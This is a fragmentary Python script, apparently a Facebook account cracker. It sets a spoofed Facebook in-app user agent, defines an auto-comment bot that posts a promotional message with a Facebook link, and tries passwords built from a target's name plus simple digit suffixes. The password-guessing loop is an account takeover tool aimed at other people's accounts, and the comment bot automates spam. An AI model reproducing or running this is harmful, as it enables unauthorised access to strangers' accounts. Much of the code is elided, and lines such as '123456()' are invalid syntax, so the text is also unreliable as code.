...
ua = ("Mozilla/5.0 (Linux; Android 8.1.0; SM-J710F Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/320.0.0.34.118;]") 
s = requests.Session()
ct = datetime.now()
n = ct.month
...
def bot_komen():
    ...
    kom = ('GW PAKE SC LU BANG 😍😘\nhttps://www.facebook.com/00015073506062/posts/1031861840659590/?app=fbl') 
...
def public():
	...
	def main(user):
		...
		try:
			...
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345',123456(),1qwerty()]:
